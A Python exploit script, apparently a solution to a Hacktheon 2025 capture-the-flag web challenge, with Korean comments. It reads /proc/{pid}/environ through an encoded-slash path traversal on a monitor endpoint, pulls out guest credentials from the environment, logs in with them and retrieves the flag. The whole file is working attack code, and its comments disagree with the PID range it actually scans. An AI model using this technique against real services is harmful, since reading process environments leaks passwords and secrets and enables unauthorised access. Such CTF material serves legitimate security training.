#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
1. /api/monitor/{pid}%2Fenviron  (pid = 1…10)   → GUEST_ID / GUEST_PWD 추출
2. /api/signin  {"username":ID,"password":PW}    → 세션 쿠키 획득
3. /api/flag    (Cookie: id=…)                   → 플래그 출력
"""

import requests, re, time, sys, json

BASE = "http://hacktheon2025-challs-alb-1354048441.ap-northeast-2.elb.amazonaws.com:58709"
sess = requests.Session()

def leak_env(pid: int):
    path = f"/api/monitor/{pid}%2Fenviron"
    r = sess.get(BASE + path, timeout=4)
    if r.status_code == 200 and "GUEST_ID=" in r.text:
        gid = re.search(r"GUEST_ID=([^\0\n]+)", r.text).group(1)
        gpw = re.search(r"GUEST_PWD=([^\0\n]+)", r.text).group(1)
        return gid, gpw
    return None, None

# ───────── 1) PID 1~10 순차 시도 ─────────
for pid in range(200, 500):
    print(f"[+] checking PID {pid}")
    gid, gpw = leak_env(pid)
    if gid:
        print(f"[✓] HIT  →  GUEST_ID={gid}  GUEST_PWD={gpw}")
        break
else:
    print("[!] 환경변수 탈취 실패")
    sys.exit(1)

# ───────── 2) 로그인 ─────────
r = sess.post(
    BASE + "/api/signin",
    json={"username": gid, "password": gpw},
    timeout=4,
)
if r.status_code != 200:
    print("[!] 로그인 실패")
    sys.exit(1)

sid = sess.cookies.get("id")
print(f"[✓] 세션 쿠키 id={sid}")

# ───────── 3) 플래그 ─────────
flag = sess.get(BASE + "/api/flag", timeout=4).text
print("[FLAG]", flag.strip())
